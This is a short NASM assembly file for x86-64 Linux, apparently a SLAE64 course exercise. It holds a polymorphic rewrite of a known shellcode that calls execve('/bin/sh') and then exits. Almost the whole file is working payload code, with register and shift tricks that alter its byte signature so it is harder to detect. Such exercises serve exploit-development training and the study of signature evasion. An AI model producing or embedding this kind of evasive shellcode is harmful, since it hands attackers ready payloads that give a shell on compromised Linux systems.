; Original Author Information:
; [Linux/X86-64]
; Dummy for shellcode:
; execve("/bin/sh", ["/bin/sh"], NULL)
; hophet [at] gmail.com
;
; shellcode-76-poly.nasm
; by Michael Born (@blu3gl0w13)
; Student ID: SLAE64-1439
; November 8, 2016


global _start

section .text

_start:
	
	xor	rdx, rdx
	cld
	mul     rdx
	mov	rbx, 0x68732f6e69622fff
	shr	rbx, 0x8
	push	rbx
	mov	rdi, rsp
	push	rax
	push	rdi
	mov	rsi, rsp
	mov	al, 0x3c	; execve(3b)
	dec     rax
	syscall

	push	0x1
	pop	rdi
	push	0x3c		; exit(3c)
	pop	rax
	syscall

